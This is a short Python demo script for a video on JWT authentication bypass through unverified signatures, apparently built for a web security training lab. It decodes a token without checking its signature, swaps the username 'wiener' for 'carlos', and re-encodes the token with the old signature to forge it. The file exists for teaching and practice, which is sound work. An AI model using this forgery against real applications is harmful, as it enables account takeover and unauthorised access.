# Demo script for 'JWT Authentication Bypass via Unverified Signature' video: https://youtu.be/-JAf08oGrcc
import jwt
import base64

# Paste JWT token here
token = 'INSERT_TOKEN_HERE'

# Decode the token (without verifying)
payload = jwt.decode(token, options={"verify_signature": False})
print(f"Decoded token: {payload}\n")

# Modify the token (JWT manipulation)
header, payload, signature = token.split('.')
decoded_payload = base64.urlsafe_b64decode(payload + '=' * (-len(payload) % 4))
modified_payload = decoded_payload.replace(b'wiener', b'carlos')
print(f"Modified payload: {modified_payload.decode()}\n")

# Generate a new token with the modified payload (re-encode)
modified_payload_b64 = base64.urlsafe_b64encode(modified_payload).rstrip(b'=').decode()
modified_token = f"{header}.{modified_payload_b64}.{signature}"
print(f"Modified token: {modified_token}\n")